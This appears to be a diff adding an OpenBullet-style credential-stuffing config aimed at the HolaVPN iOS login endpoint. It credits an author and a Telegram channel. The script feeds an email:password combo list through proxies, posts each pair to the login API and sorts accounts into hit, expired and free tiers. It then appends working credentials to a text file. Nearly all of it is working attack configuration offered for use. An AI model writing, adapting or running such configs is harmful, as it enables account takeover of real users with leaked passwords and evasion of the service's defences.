@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "HolaVPN",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-17T04:43:28.7701413-08:00",
+  "AdditionalInfo": "Telegram Channel : T.me/ghoulblack",
+  "RequiredPlugins": [],
+  "Author": "👑LilTOBA👑",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#P REQUEST POST "https://client.hola.org/client_cgi/ios/login" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: client.hola.org" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Hola-Version: 2.12" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: HolaVPN/2.12 (iPhone; iOS 12.4.7; Scale/2.00)" 
+  HEADER "Accept-Language: fr-FR;q=1, ar-FR;q=0.9, en-GB;q=0.8, ja-JP;q=0.7, vi-VN;q=0.6, sr-Latn-FR;q=0.5" 
+  HEADER "Content-Length: 43" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Unauthorized" 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Precondition Failed" 
+
+PARSE "<SOURCE>" LR "membership\":" "},\"" -> CAP "membership" "" "}" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "trial\":false,\"active\":false" 
+
+UTILITY File "Hola.txt" AppendLines "<USER>: <PASS> //\\n =============================" 
+
